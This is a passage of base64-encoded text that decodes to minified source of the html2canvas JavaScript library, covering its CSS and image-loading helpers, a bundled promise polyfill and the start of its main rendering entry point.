5ub2RlLmRhdGEudHJpbSgpLmxlbmd0aD4wfWZ1bmN0aW9uIEcodCl7cmV0dXJuL14obm9ybWFsfG5vbmV8MHB4KSQvLnRlc3QodC5wYXJlbnQuY3NzKCJsZXR0ZXJTcGFjaW5nIikpfWZ1bmN0aW9uIFUodCl7cmV0dXJuWyJUb3BMZWZ0IiwiVG9wUmlnaHQiLCJCb3R0b21SaWdodCIsIkJvdHRvbUxlZnQiXS5tYXAoZnVuY3Rpb24oZSl7dmFyIG49dC5jc3MoImJvcmRlciIrZSsiUmFkaXVzIikscj1uLnNwbGl0KCIgIik7cmV0dXJuIHIubGVuZ3RoPD0xJiYoclsxXT1yWzBdKSxyLm1hcChvZSl9KX1mdW5jdGlvbiBRKHQpe3JldHVybiB0Lm5vZGVUeXBlPT09Tm9kZS5URVhUX05PREV8fHQubm9kZVR5cGU9PT1Ob2RlLkVMRU1FTlRfTk9ERX1mdW5jdGlvbiBxKHQpe3ZhciBlPXQuY3NzKCJwb3NpdGlvbiIpLG49ImFic29sdXRlIj09PWV8fCJyZWxhdGl2ZSI9PT1lP3QuY3NzKCJ6SW5kZXgiKToiYXV0byI7cmV0dXJuImF1dG8iIT09bn1mdW5jdGlvbiAkKHQpe3JldHVybiJzdGF0aWMiIT09dC5jc3MoInBvc2l0aW9uIil9ZnVuY3Rpb24gSih0KXtyZXR1cm4ibm9uZSIhPT10LmNzcygiZmxvYXQiKX1mdW5jdGlvbiBLKHQpe3JldHVybi0xIT09WyJpbmxpbmUtYmxvY2siLCJpbmxpbmUtdGFibGUiXS5pbmRleE9mKHQuY3NzKCJkaXNwbGF5IikpfWZ1bmN0aW9uIFoodCl7dmFyIGU9dGhpcztyZXR1cm4gZnVuY3Rpb24oKXtyZXR1cm4hdC5hcHBseShlLGFyZ3VtZW50cyl9fWZ1bmN0aW9uIHRlKHQpe3JldHVybiB0Lm5vZGUubm9kZVR5cGU9PT1Ob2RlLkVMRU1FTlRfTk9ERX1mdW5jdGlvbiBlZSh0KXtyZXR1cm4gdC5ub2RlLm5vZGVUeXBlPT09Tm9kZS5URVhUX05PREV9ZnVuY3Rpb24gbmUodCxlKXtyZXR1cm4gdC5jc3NJbnQoInpJbmRleCIpLWUuY3NzSW50KCJ6SW5kZXgiKX1mdW5jdGlvbiByZSh0KXtyZXR1cm4gdC5jc3MoIm9wYWNpdHkiKTwxfWZ1bmN0aW9uIGllKHQsZSl7cmV0dXJuIGZ1bmN0aW9uKCl7cmV0dXJuIHQuYXBwbHkoZSxhcmd1bWVudHMpfX1mdW5jdGlvbiBvZSh0KXtyZXR1cm4gcGFyc2VJbnQodCwxMCl9ZnVuY3Rpb24gc2UodCl7cmV0dXJuIHQud2lkdGh9ZnVuY3Rpb24gYWUodCl7cmV0dXJuIHQubm9kZS5ub2RlVHlwZSE9PU5vZGUuRUxFTUVOVF9OT0RFfHwtMT09PVsiU0NSSVBUIiwiSEVBRCIsIlRJVExFIiwiT0JKRUNUIiwiQlIiLCJPUFRJT04iXS5pbmRleE9mKHQubm9kZS5ub2RlTmFtZSl9ZnVuY3Rpb24gY2UodCl7cmV0dXJuW10uY29uY2F0LmFwcGx5KFtdLHQpfWZ1bmN0aW9uIGhlKHQpe3ZhciBlPXQuc3Vic3RyKDAsMSk7cmV0dXJuIGU9PT10LnN1YnN0cih0Lmxlbmd0aC0xKSYmZS5tYXRjaCgvJ3wiLyk/dC5zdWJzdHIoMSx0Lmxlbmd0aC0yKTp0fWZ1bmN0aW9uIHVlKHIsaSl7dmFyIG89Imh0bWwyY2FudmFzXyIrVGUrKyxzPWUuY3JlYXRlRWxlbWVudCgic2NyaXB0IiksYT1lLmNyZWF0ZUVsZW1lbnQoImEiKTthLmhyZWY9cixyPWEuaHJlZjt2YXIgYz1pKyhpLmluZGV4T2YoIj8iKT4tMT8iJiI6Ij8iKSsidXJsPSIrZW5jb2RlVVJJQ29tcG9uZW50KHIpKyImY2FsbGJhY2s9IitvO3RoaXMuc3JjPXIsdGhpcy5pbWFnZT1uZXcgSW1hZ2U7dmFyIGg9dGhpczt0aGlzLnByb21pc2U9bmV3IFByb21pc2UoZnVuY3Rpb24ocixpKXtoLmltYWdlLm9ubG9hZD1yLGguaW1hZ2Uub25lcnJvcj1pLHRbb109ZnVuY3Rpb24oZSl7ImVycm9yOiI9PT1lLnN1YnN0cmluZygwLDYpP2koKTpoLmltYWdlLnNyYz1lLHRbb109bjt0cnl7ZGVsZXRlIHRbb119Y2F0Y2gocil7fXMucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChzKX0scy5zZXRBdHRyaWJ1dGUoInR5cGUiLCJ0ZXh0L2phdmFzY3JpcHQiKSxzLnNldEF0dHJpYnV0ZSgic3JjIixjKSxlLmJvZHkuYXBwZW5kQ2hpbGQocyl9KVsiY2F0Y2giXShmdW5jdGlvbigpe3ZhciB0PW5ldyBwKHIpO3JldHVybiB0LnByb21pc2UudGhlbihmdW5jdGlvbih0KXtoLmltYWdlPXR9KX0pfWZ1bmN0aW9uIHBlKHQsZSxuLHIpe3RoaXMud2lkdGg9dCx0aGlzLmhlaWdodD1lLHRoaXMuaW1hZ2VzPW4sdGhpcy5vcHRpb25zPXJ9ZnVuY3Rpb24gbGUodCxlLG4scil7VC5jYWxsKHRoaXMsbixyKSx0aGlzLm93blN0YWNraW5nPXQsdGhpcy5jb250ZXh0cz1bXSx0aGlzLmNoaWxkcmVuPVtdLHRoaXMub3BhY2l0eT0odGhpcy5wYXJlbnQ/dGhpcy5wYXJlbnQuc3RhY2sub3BhY2l0eToxKSplfWZ1bmN0aW9uIGRlKHQpe3RoaXMucmFuZ2VCb3VuZHM9dGhpcy50ZXN0UmFuZ2VCb3VuZHModCksdGhpcy5jb3JzPXRoaXMudGVzdENPUlMoKSx0aGlzLnN2Zz10aGlzLnRlc3RTVkcoKX1mdW5jdGlvbiBmZSh0KXt0aGlzLnNyYz10LHRoaXMuaW1hZ2U9bnVsbDt2YXIgZT10aGlzO3RoaXMucHJvbWlzZT10aGlzLmhhc0ZhYnJpYygpLnRoZW4oZnVuY3Rpb24oKXtyZXR1cm4gZS5pc0lubGluZSh0KT9Qcm9taXNlLnJlc29sdmUoZS5pbmxpbmVGb3JtYXR0aW5nKHQpKTpiZSh0KX0pLnRoZW4oZnVuY3Rpb24odCl7cmV0dXJuIG5ldyBQcm9taXNlKGZ1bmN0aW9uKG4pe2h0bWwyY2FudmFzLmZhYnJpYy5sb2FkU1ZHRnJvbVN0cmluZyh0LGUuY3JlYXRlQ2FudmFzLmNhbGwoZSxuKSl9KX0pfWZ1bmN0aW9uIGdlKHQpe3ZhciBlLG4scixpLG8scyxhLGMsaD0iQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLyIsdT10Lmxlbmd0aCxwPSIiO2ZvcihlPTA7dT5lO2UrPTQpbj1oLmluZGV4T2YodFtlXSkscj1oLmluZGV4T2YodFtlKzFdKSxpPWguaW5kZXhPZih0W2UrMl0pLG89aC5pbmRleE9mKHRbZSszXSkscz1uPDwyfHI+PjQsYT0oMTUmcik8PDR8aT4+MixjPSgzJmkpPDw2fG8scCs9NjQ9PT1pP1N0cmluZy5mcm9tQ2hhckNvZGUocyk6NjQ9PT1vfHwtMT09PW8/U3RyaW5nLmZyb21DaGFyQ29kZShzLGEpOlN0cmluZy5mcm9tQ2hhckNvZGUocyxhLGMpO3JldHVybiBwfWZ1bmN0aW9uIG1lKHQpe3RoaXMuc3JjPXQsdGhpcy5pbWFnZT1udWxsO3ZhciBlPXRoaXM7dGhpcy5wcm9taXNlPXRoaXMuaGFzRmFicmljKCkudGhlbihmdW5jdGlvbigpe3JldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihuKXtodG1sMmNhbnZhcy5mYWJyaWMucGFyc2VTVkdEb2N1bWVudCh0LGUuY3JlYXRlQ2FudmFzLmNhbGwoZSxuKSl9KX0pfWZ1bmN0aW9uIHllKHQsZSl7VC5jYWxsKHRoaXMsdCxlKX1mdW5jdGlvbiB2ZSh0LGUsbil7cmV0dXJuIHQubGVuZ3RoPjA/ZStuLnRvVXBwZXJDYXNlKCk6dm9pZCAwfWZ1bmN0aW9uIHdlKHQpe2YuYXBwbHkodGhpcyxhcmd1bWVudHMpLHRoaXMudHlwZT0ibGluZWFyIj09PXQuYXJnc1swXT90aGlzLlRZUEVTLkxJTkVBUjp0aGlzLlRZUEVTLlJBRElBTH1mdW5jdGlvbiBiZSh0KXtyZXR1cm4gbmV3IFByb21pc2UoZnVuY3Rpb24oZSxuKXt2YXIgcj1uZXcgWE1MSHR0cFJlcXVlc3Q7ci5vcGVuKCJHRVQiLHQpLHIub25sb2FkPWZ1bmN0aW9uKCl7MjAwPT09ci5zdGF0dXM/ZShyLnJlc3BvbnNlVGV4dCk6bihuZXcgRXJyb3Ioci5zdGF0dXNUZXh0KSl9LHIub25lcnJvcj1mdW5jdGlvbigpe24obmV3IEVycm9yKCJOZXR3b3JrIEVycm9yIikpfSxyLnNlbmQoKX0pfWZ1bmN0aW9uIHhlKHQsbil7cGUuYXBwbHkodGhpcyxhcmd1bWVudHMpLHRoaXMuY2FudmFzPWUuY3JlYXRlRWxlbWVudCgiY2FudmFzIiksdGhpcy5jYW52YXMud2lkdGg9dCx0aGlzLmNhbnZhcy5oZWlnaHQ9bix0aGlzLmN0eD10aGlzLmNhbnZhcy5nZXRDb250ZXh0KCIyZCIpLHRoaXMudGFpbnRDdHg9ZS5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpLHRoaXMuY3R4LnRleHRCYXNlbGluZT0iYm90dG9tIix0aGlzLnZhcmlhYmxlcz17fSxFKCJJbml0aWFsaXplZCBDYW52YXNSZW5kZXJlciIpfWlmKCFmdW5jdGlvbigpe3ZhciBuLHIsaSxvOyFmdW5jdGlvbigpe3ZhciB0PXt9LGU9e307bj1mdW5jdGlvbihlLG4scil7dFtlXT17ZGVwczpuLGNhbGxiYWNrOnJ9fSxvPWk9cj1mdW5jdGlvbihuKXtmdW5jdGlvbiBpKHQpe2lmKCIuIiE9PXQuY2hhckF0KDApKXJldHVybiB0O2Zvcih2YXIgZT10LnNwbGl0KCIvIikscj1uLnNwbGl0KCIvIikuc2xpY2UoMCwtMSksaT0wLG89ZS5sZW5ndGg7bz5pO2krKyl7dmFyIHM9ZVtpXTtpZigiLi4iPT09cylyLnBvcCgpO2Vsc2V7aWYoIi4iPT09cyljb250aW51ZTtyLnB1c2gocyl9fXJldHVybiByLmpvaW4oIi8iKX1pZihvLl9lYWtfc2Vlbj10LGVbbl0pcmV0dXJuIGVbbl07aWYoZVtuXT17fSwhdFtuXSl0aHJvdyBuZXcgRXJyb3IoIkNvdWxkIG5vdCBmaW5kIG1vZHVsZSAiK24pO2Zvcih2YXIgcyxhPXRbbl0sYz1hLmRlcHMsaD1hLmNhbGxiYWNrLHU9W10scD0wLGw9Yy5sZW5ndGg7bD5wO3ArKyl1LnB1c2goImV4cG9ydHMiPT09Y1twXT9zPXt9OnIoaShjW3BdKSkpO3ZhciBkPWguYXBwbHkodGhpcyx1KTtyZXR1cm4gZVtuXT1zfHxkfX0oKSxuKCJwcm9taXNlL2FsbCIsWyIuL3V0aWxzIiwiZXhwb3J0cyJdLGZ1bmN0aW9uKHQsZSl7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIG4odCl7dmFyIGU9dGhpcztpZighcih0KSl0aHJvdyBuZXcgVHlwZUVycm9yKCJZb3UgbXVzdCBwYXNzIGFuIGFycmF5IHRvIGFsbC4iKTtyZXR1cm4gbmV3IGUoZnVuY3Rpb24oZSxuKXtmdW5jdGlvbiByKHQpe3JldHVybiBmdW5jdGlvbihlKXtvKHQsZSl9fWZ1bmN0aW9uIG8odCxuKXthW3RdPW4sMD09PS0tYyYmZShhKX12YXIgcyxhPVtdLGM9dC5sZW5ndGg7MD09PWMmJmUoW10pO2Zvcih2YXIgaD0wO2g8dC5sZW5ndGg7aCsrKXM9dFtoXSxzJiZpKHMudGhlbik/cy50aGVuKHIoaCksbik6byhoLHMpfSl9dmFyIHI9dC5pc0FycmF5LGk9dC5pc0Z1bmN0aW9uO2UuYWxsPW59KSxuKCJwcm9taXNlL2FzYXAiLFsiZXhwb3J0cyJdLGZ1bmN0aW9uKG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKCl7cmV0dXJuIGZ1bmN0aW9uKCl7cHJvY2Vzcy5uZXh0VGljayhzKX19ZnVuY3Rpb24gaSgpe3ZhciB0PTAsbj1uZXcgdShzKSxyPWUuY3JlYXRlVGV4dE5vZGUoIiIpO3JldHVybiBuLm9ic2VydmUocix7Y2hhcmFjdGVyRGF0YTohMH0pLGZ1bmN0aW9uKCl7ci5kYXRhPXQ9Kyt0JTJ9fWZ1bmN0aW9uIG8oKXtyZXR1cm4gZnVuY3Rpb24oKXtwLnNldFRpbWVvdXQocywxKX19ZnVuY3Rpb24gcygpe2Zvcih2YXIgdD0wO3Q8bC5sZW5ndGg7dCsrKXt2YXIgZT1sW3RdLG49ZVswXSxyPWVbMV07bihyKX1sPVtdfWZ1bmN0aW9uIGEodCxlKXt2YXIgbj1sLnB1c2goW3QsZV0pOzE9PT1uJiZjKCl9dmFyIGMsaD0idW5kZWZpbmVkIiE9dHlwZW9mIHQ/dDp7fSx1PWguTXV0YXRpb25PYnNlcnZlcnx8aC5XZWJLaXRNdXRhdGlvbk9ic2VydmVyLHA9InVuZGVmaW5lZCIhPXR5cGVvZiBnbG9iYWw/Z2xvYmFsOnRoaXMsbD1bXTtjPSJ1bmRlZmluZWQiIT10eXBlb2YgcHJvY2VzcyYmIltvYmplY3QgcHJvY2Vzc10iPT09e30udG9TdHJpbmcuY2FsbChwcm9jZXNzKT9yKCk6dT9pKCk6bygpLG4uYXNhcD1hfSksbigicHJvbWlzZS9jYXN0IixbImV4cG9ydHMiXSxmdW5jdGlvbih0KXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gZSh0KXtpZih0JiYib2JqZWN0Ij09dHlwZW9mIHQmJnQuY29uc3RydWN0b3I9PT10aGlzKXJldHVybiB0O3ZhciBlPXRoaXM7cmV0dXJuIG5ldyBlKGZ1bmN0aW9uKGUpe2UodCl9KX10LmNhc3Q9ZX0pLG4oInByb21pc2UvY29uZmlnIixbImV4cG9ydHMiXSxmdW5jdGlvbih0KXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gZSh0LGUpe3JldHVybiAyIT09YXJndW1lbnRzLmxlbmd0aD9uW3RdOnZvaWQoblt0XT1lKX12YXIgbj17aW5zdHJ1bWVudDohMX07dC5jb25maWc9bix0LmNvbmZpZ3VyZT1lfSksbigicHJvbWlzZS9wb2x5ZmlsbCIsWyIuL3Byb21pc2UiLCIuL3V0aWxzIiwiZXhwb3J0cyJdLGZ1bmN0aW9uKGUsbixyKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gaSgpe3ZhciBlPSJQcm9taXNlImluIHQmJiJjYXN0ImluIHQuUHJvbWlzZSYmInJlc29sdmUiaW4gdC5Qcm9taXNlJiYicmVqZWN0ImluIHQuUHJvbWlzZSYmImFsbCJpbiB0LlByb21pc2UmJiJyYWNlImluIHQuUHJvbWlzZSYmZnVuY3Rpb24oKXt2YXIgZTtyZXR1cm4gbmV3IHQuUHJvbWlzZShmdW5jdGlvbih0KXtlPXR9KSxzKGUpfSgpO2V8fCh0LlByb21pc2U9byl9dmFyIG89ZS5Qcm9taXNlLHM9bi5pc0Z1bmN0aW9uO3IucG9seWZpbGw9aX0pLG4oInByb21pc2UvcHJvbWlzZSIsWyIuL2NvbmZpZyIsIi4vdXRpbHMiLCIuL2Nhc3QiLCIuL2FsbCIsIi4vcmFjZSIsIi4vcmVzb2x2ZSIsIi4vcmVqZWN0IiwiLi9hc2FwIiwiZXhwb3J0cyJdLGZ1bmN0aW9uKHQsZSxuLHIsaSxvLHMsYSxjKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gaCh0KXtpZighRSh0KSl0aHJvdyBuZXcgVHlwZUVycm9yKCJZb3UgbXVzdCBwYXNzIGEgcmVzb2x2ZXIgZnVuY3Rpb24gYXMgdGhlIGZpcnN0IGFyZ3VtZW50IHRvIHRoZSBwcm9taXNlIGNvbnN0cnVjdG9yIik7aWYoISh0aGlzIGluc3RhbmNlb2YgaCkpdGhyb3cgbmV3IFR5cGVFcnJvcigiRmFpbGVkIHRvIGNvbnN0cnVjdCAnUHJvbWlzZSc6IFBsZWFzZSB1c2UgdGhlICduZXcnIG9wZXJhdG9yLCB0aGlzIG9iamVjdCBjb25zdHJ1Y3RvciBjYW5ub3QgYmUgY2FsbGVkIGFzIGEgZnVuY3Rpb24uIik7dGhpcy5fc3Vic2NyaWJlcnM9W10sdSh0LHRoaXMpfWZ1bmN0aW9uIHUodCxlKXtmdW5jdGlvbiBuKHQpe2coZSx0KX1mdW5jdGlvbiByKHQpe3koZSx0KX10cnl7dChuLHIpfWNhdGNoKGkpe3IoaSl9fWZ1bmN0aW9uIHAodCxlLG4scil7dmFyIGksbyxzLGEsYz1FKG4pO2lmKGMpdHJ5e2k9bihyKSxzPSEwfWNhdGNoKGgpe2E9ITAsbz1ofWVsc2UgaT1yLHM9ITA7ZihlLGkpfHwoYyYmcz9nKGUsaSk6YT95KGUsbyk6dD09PU0/ZyhlLGkpOnQ9PT1QJiZ5KGUsaSkpfWZ1bmN0aW9uIGwodCxlLG4scil7dmFyIGk9dC5fc3Vic2NyaWJlcnMsbz1pLmxlbmd0aDtpW29dPWUsaVtvK01dPW4saVtvK1BdPXJ9ZnVuY3Rpb24gZCh0LGUpe2Zvcih2YXIgbixyLGk9dC5fc3Vic2NyaWJlcnMsbz10Ll9kZXRhaWwscz0wO3M8aS5sZW5ndGg7cys9MyluPWlbc10scj1pW3MrZV0scChlLG4scixvKTt0Ll9zdWJzY3JpYmVycz1udWxsfWZ1bmN0aW9uIGYodCxlKXt2YXIgbixyPW51bGw7dHJ5e2lmKHQ9PT1lKXRocm93IG5ldyBUeXBlRXJyb3IoIkEgcHJvbWlzZXMgY2FsbGJhY2sgY2Fubm90IHJldHVybiB0aGF0IHNhbWUgcHJvbWlzZS4iKTtpZih4KGUpJiYocj1lLnRoZW4sRShyKSkpcmV0dXJuIHIuY2FsbChlLGZ1bmN0aW9uKHIpe3JldHVybiBuPyEwOihuPSEwLHZvaWQoZSE9PXI/Zyh0LHIpOm0odCxyKSkpfSxmdW5jdGlvbihlKXtyZXR1cm4gbj8hMDoobj0hMCx2b2lkIHkodCxlKSl9KSwhMH1jYXRjaChpKXtyZXR1cm4gbj8hMDooeSh0LGkpLCEwKX1yZXR1cm4hMX1mdW5jdGlvbiBnKHQsZSl7dD09PWU/bSh0LGUpOmYodCxlKXx8bSh0LGUpfWZ1bmN0aW9uIG0odCxlKXt0Ll9zdGF0ZT09PU8mJih0Ll9zdGF0ZT1CLHQuX2RldGFpbD1lLGIuYXN5bmModix0KSl9ZnVuY3Rpb24geSh0LGUpe3QuX3N0YXRlPT09TyYmKHQuX3N0YXRlPUIsdC5fZGV0YWlsPWUsYi5hc3luYyh3LHQpKX1mdW5jdGlvbiB2KHQpe2QodCx0Ll9zdGF0ZT1NKX1mdW5jdGlvbiB3KHQpe2QodCx0Ll9zdGF0ZT1QKX12YXIgYj10LmNvbmZpZyx4PSh0LmNvbmZpZ3VyZSxlLm9iamVjdE9yRnVuY3Rpb24pLEU9ZS5pc0Z1bmN0aW9uLFQ9KGUubm93LG4uY2FzdCksQz1yLmFsbCxrPWkucmFjZSxJPW8ucmVzb2x2ZSxTPXMucmVqZWN0LFI9YS5hc2FwO2IuYXN5bmM9Ujt2YXIgTz12b2lkIDAsQj0wLE09MSxQPTI7aC5wcm90b3R5cGU9e2NvbnN0cnVjdG9yOmgsX3N0YXRlOnZvaWQgMCxfZGV0YWlsOnZvaWQgMCxfc3Vic2NyaWJlcnM6dm9pZCAwLHRoZW46ZnVuY3Rpb24odCxlKXt2YXIgbj10aGlzLHI9bmV3IHRoaXMuY29uc3RydWN0b3IoZnVuY3Rpb24oKXt9KTtpZih0aGlzLl9zdGF0ZSl7dmFyIGk9YXJndW1lbnRzO2IuYXN5bmMoZnVuY3Rpb24oKXtwKG4uX3N0YXRlLHIsaVtuLl9zdGF0ZS0xXSxuLl9kZXRhaWwpfSl9ZWxzZSBsKHRoaXMscix0LGUpO3JldHVybiByfSwiY2F0Y2giOmZ1bmN0aW9uKHQpe3JldHVybiB0aGlzLnRoZW4obnVsbCx0KX19LGguYWxsPUMsaC5jYXN0PVQsaC5yYWNlPWssaC5yZXNvbHZlPUksaC5yZWplY3Q9UyxjLlByb21pc2U9aH0pLG4oInByb21pc2UvcmFjZSIsWyIuL3V0aWxzIiwiZXhwb3J0cyJdLGZ1bmN0aW9uKHQsZSl7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIG4odCl7dmFyIGU9dGhpcztpZighcih0KSl0aHJvdyBuZXcgVHlwZUVycm9yKCJZb3UgbXVzdCBwYXNzIGFuIGFycmF5IHRvIHJhY2UuIik7cmV0dXJuIG5ldyBlKGZ1bmN0aW9uKGUsbil7Zm9yKHZhciByLGk9MDtpPHQubGVuZ3RoO2krKylyPXRbaV0sciYmImZ1bmN0aW9uIj09dHlwZW9mIHIudGhlbj9yLnRoZW4oZSxuKTplKHIpfSl9dmFyIHI9dC5pc0FycmF5O2UucmFjZT1ufSksbigicHJvbWlzZS9yZWplY3QiLFsiZXhwb3J0cyJdLGZ1bmN0aW9uKHQpeyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiBlKHQpe3ZhciBlPXRoaXM7cmV0dXJuIG5ldyBlKGZ1bmN0aW9uKGUsbil7bih0KX0pfXQucmVqZWN0PWV9KSxuKCJwcm9taXNlL3Jlc29sdmUiLFsiZXhwb3J0cyJdLGZ1bmN0aW9uKHQpeyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiBlKHQpe3ZhciBlPXRoaXM7cmV0dXJuIG5ldyBlKGZ1bmN0aW9uKGUpe2UodCl9KX10LnJlc29sdmU9ZX0pLG4oInByb21pc2UvdXRpbHMiLFsiZXhwb3J0cyJdLGZ1bmN0aW9uKHQpeyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiBlKHQpe3JldHVybiBuKHQpfHwib2JqZWN0Ij09dHlwZW9mIHQmJm51bGwhPT10fWZ1bmN0aW9uIG4odCl7cmV0dXJuImZ1bmN0aW9uIj09dHlwZW9mIHR9ZnVuY3Rpb24gcih0KXtyZXR1cm4iW29iamVjdCBBcnJheV0iPT09T2JqZWN0LnByb3RvdHlwZS50b1N0cmluZy5jYWxsKHQpfXZhciBpPURhdGUubm93fHxmdW5jdGlvbigpe3JldHVybihuZXcgRGF0ZSkuZ2V0VGltZSgpfTt0Lm9iamVjdE9yRnVuY3Rpb249ZSx0LmlzRnVuY3Rpb249bix0LmlzQXJyYXk9cix0Lm5vdz1pfSkscigicHJvbWlzZS9wb2x5ZmlsbCIpLnBvbHlmaWxsKCl9KCksImZ1bmN0aW9uIiE9dHlwZW9mIE9iamVjdC5jcmVhdGV8fCJmdW5jdGlvbiIhPXR5cGVvZiBlLmNyZWF0ZUVsZW1lbnQoImNhbnZhcyIpLmdldENvbnRleHQpcmV0dXJuIHZvaWQodC5odG1sMmNhbnZhcz1mdW5jdGlvbigpe3JldHVybiBQcm9taXNlLnJlamVjdCgiTm8gY2FudmFzIHN1cHBvcnQiKX0pO3ZhciBFZT0iZGF0YS1odG1sMmNhbnZhcy1ub2RlIjt0Lmh0bWwyY2FudmFzPWZ1bmN0aW9uKGksbyl7bz1vfHx7fSxvLmxvZ2dpbmcmJih0Lmh0bWwyY2FudmFzLmxvZ2dpbmc9ITAsdC5odG1sMmNhbnZhcy5zdGFydD1EYXRlLm5vdygpKSxvLmFzeW5jPSJ1bmRlZmluZWQiPT10eXBlb2Ygby5hc3luYz8hMDpvLmFzeW5jLG8uYWxsb3dUYWludD0idW5kZWZpbmVkIj09dHlwZW9mIG8uYWxsb3dUYWludD8hMTpvLmFsbG93VGFpbnQsby5yZW1vdmVDb250YWluZXI9InVuZGVmaW5lZCI9PXR5cGVvZiBvLnJlbW92ZUNvbnRhaW5lcj8hMDpvLnJlbW92ZUNvbnRhaW5lcjt2YXIgcz0oaT09PW4/W2UuZG9jdW1lbnRFbGVtZW50XTppLmxlbmd0aD9pOltpXSlbMF07cmV0dXJuIHMuc2V0QXR0cmlidXRlKEVlLCJ0cnVlIikscihzLm93bmVyRG9jdW1lbnQsbyx0LmlubmVyV2lkdGgsdC5pbm5lckhlaWdodCkudGhlbihmdW5jdGlvbih0KXtyZXR1cm4iZnVuY3Rpb24iPT10eXBlb2Ygby5vbnJlbmRlcmVkJiYoRSgib3B0aW9ucy5vbnJlbmRlcmVkIGlzIGRlcHJlY2F0ZWQsIGh0bWwyY2FudmFzIHJldHVybnMgYSBQcm9taXNlIGNvbnRhaW5pbmcgdGhlIGNhbnZhcyIpLG8ub25yZW5kZXJlZCh0KSksdH0pfSxkLnByb3RvdHlwZS5nZXRNZXRyaWNzPWZ1bmN0aW9uKHQsZSl7cmV0dXJuIHRoaXMuZGF0YVt0KyItIitlXT09PW4mJih0aGlzLmRhdGFbdCsiLSIrZV09bmV3IGwodCxlKSksdGhpcy5kYXRhW3QrIi0iK2VdfSxmLnByb3RvdHlwZS5UWVBFUz17TElORUFSOjEsUkFESUFMOjJ9LGYucHJvdG90eXBlLmFuZ2xlUmVnRXhwPS8oWystXT9cZCpcLj9cZCspKGRlZ3xncmFkfHJhZHx0dXJuKS8sbS5wcm90b3R5cGUuZmluZEltYWdlcz1mdW5jdGlvbih0KXt2YXIgZT1bXTtyZXR1cm4gdC5maWx0ZXIoeSkubWFwKHcpLmZvckVhY2godGhpcy5hZGRJbWFnZShlLHRoaXMubG9hZEltYWdlKSx0aGlzKSx0LmZpbHRlcih2KS5tYXAoYikuZm9yRWFjaCh0aGlzLmFkZEltYWdlKGUsdGhpcy5sb2FkSW1hZ2UpLHRoaXMpLGV9LG0ucHJvdG90eXBlLmZpbmRCYWNrZ3JvdW5kSW1hZ2U9ZnVuY3Rpb24odCxlKXtyZXR1cm4gZS5wYXJzZUJhY2tncm91bmRJbWFnZXMoKS5maWx0ZXIodGhpcy5oYXNJbWFnZUJhY2tncm91bmQpLmZvckVhY2godGhpcy5hZGRJbWFnZSh0LHRoaXMubG9hZEltYWdlKSx0aGlzKSx0fSxtLnByb3RvdHlwZS5hZGRJbWFnZT1mdW5jdGlvbih0LGUpe3JldHVybiBmdW5jdGlvbihuKXtuLmFyZ3MuZm9yRWFjaChmdW5jdGlvbihyKXt0aGlzLmltYWdlRXhpc3RzKHQscil8fCh0LnNwbGljZSgwLDAsZS5jYWxsKHRoaXMsbikpLEUoIkFkZGVkIGltYWdlICMiK3QubGVuZ3RoLCJzdHJpbmciPT10eXBlb2Ygcj9yLnN1YnN0cmluZygwLDEwMCk6cikpfSx0aGlzKX19LG0ucHJvdG90eXBlLmhhc0ltYWdlQmFja2dyb3VuZD1mdW5jdGlvbih0KXtyZXR1cm4ibm9uZSIhPT10Lm1ldGhvZH0sbS5wcm90b3R5cGUubG9hZEltYWdlPWZ1bmN0aW9uKHQpe2lmKCJ1cmwiPT09dC5tZXRob2Qpe3ZhciBlPXQuYXJnc1swXTtyZXR1cm4hdGhpcy5pc1NWRyhlKXx8dGhpcy5zdXBwb3J0LnN2Z3x8dGhpcy5vcHRpb25zLmFsbG93VGFpbnQ/ZS5tYXRjaCgvZGF0YTppbWFnZVwvLio7YmFzZTY0LC9pKT9uZXcgZyhlLnJlcGxhY2UoL3VybFwoWyciXXswLH18WyciXXswLH1cKSQvZ2ksIiIpLCExKTp0aGlzLmlzU2FtZU9yaWdpbihlKXx8dGhpcy5vcHRpb25zLmFsbG93VGFpbnQ9PT0hMHx8dGhpcy5pc1NWRyhlKT9uZXcgZyhlLCExKTp0aGlzLnN1cHBvcnQuY29ycyYmIXRoaXMub3B0aW9ucy5hbGxvd1RhaW50JiZ0aGlzLm9wdGlvbnMudXNlQ09SUz9uZXcgZyhlLCEwKTp0aGlzLm9wdGlvbnMucHJveHk/bmV3IHVlKGUsdGhpcy5vcHRpb25zLnByb3h5KTpuZXcgcChlKTpuZXcgZmUoZSl9cmV0dXJuImxpbmVhci1ncmFkaWVudCI9PT10Lm1ldGhvZD9uZXcgeCh0KToiZ3JhZGllbnQiPT09dC5tZXRob2Q/bmV3IHdlKHQpOiJzdmciPT09dC5tZXRob2Q/bmV3IG1lKHQuYXJnc1swXSk6bmV3IHAodCl9LG0ucHJvdG90eXBlLmlzU1ZHPWZ1bmN0aW9uKHQpe3JldHVybi8oLispLnN2ZyQvaS50ZXN0KHQpfHxmZS5wcm90b3R5cGUuaXNJbmxpbmUodCl9LG0ucHJvdG90eXBlLmltYWdlRXhpc3RzPWZ1bmN0aW9uKHQsZSl7cmV0dXJuIHQuc29tZShmdW5jdGlvbih0KXtyZXR1cm4gdC5zcmM9PT1lfSl9LG0ucHJvdG90eXBlLmlzU2FtZU9yaWdpbj1mdW5jdGlvbih0KXt2YXIgbj10aGlzLmxpbmt8fCh0aGlzLmxpbms9ZS5jcmVhdGVFbGVtZW50KCJhIikpO24uaHJlZj10LG4uaHJlZj1uLmhyZWY7dmFyIHI9bi5wcm90b2NvbCtuLmhvc3RuYW1lK24ucG9ydDtyZXR1cm4gcj09PXRoaXMub3JpZ2lufSxtLnByb3RvdHlwZS5nZXRQcm9taXNlPWZ1bmN0aW9uKHQpe3JldHVybiB0LnByb21pc2V9LG0ucHJvdG90eXBlLmdldD1mdW5jdGlvb